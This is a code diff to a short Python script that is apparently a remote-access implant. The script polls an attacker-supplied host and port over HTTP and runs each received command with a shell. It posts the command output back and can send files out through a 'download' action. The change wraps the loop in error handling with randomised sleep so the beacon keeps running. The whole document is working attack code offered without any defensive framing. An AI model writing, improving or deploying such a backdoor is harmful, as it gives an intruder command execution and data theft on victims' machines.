@@ -4,6 +4,7 @@ import subprocess
 import time
 import os
 import base64
+import random
 
 url = ''
 
@@ -33,25 +34,29 @@ def main():
     sys.argv = sys.argv[1:]
     url = 'http://' + sys.argv[0] + ':' + sys.argv[1]
     while True:
-        request = requests.get(url)
-        command = request.text
+        try:
+            request = requests.get(url)
+            command = request.text
 
-        command_split = command.split(' ', 1)
-        action = command_split[0].lower()
-        if len(command_split) == 2:
-            args = command_split[1]
-        else:
-            args = ''
+            command_split = command.split(' ', 1)
+            action = command_split[0].lower()
+            if len(command_split) == 2:
+                args = command_split[1]
+            else:
+                args = ''
 
-        if 'exit' in action:
-            break
-        elif 'download' in action:
-            send_file(args)
-        else:
-            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            requests.post(url=url, data=cmd.stdout.read())
-            requests.post(url=url, data=cmd.stderr.read())
+            if 'exit' in action:
+                break
+            elif 'download' in action:
+                send_file(args)
+            else:
+                cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                requests.post(url=url, data=cmd.stdout.read())
+                requests.post(url=url, data=cmd.stderr.read())
 
-        time.sleep(3)
+            time.sleep(3)
+        except:
+            sleep_time = random.randrange(1,10)
+            time.sleep(sleep_time)
 
 main()
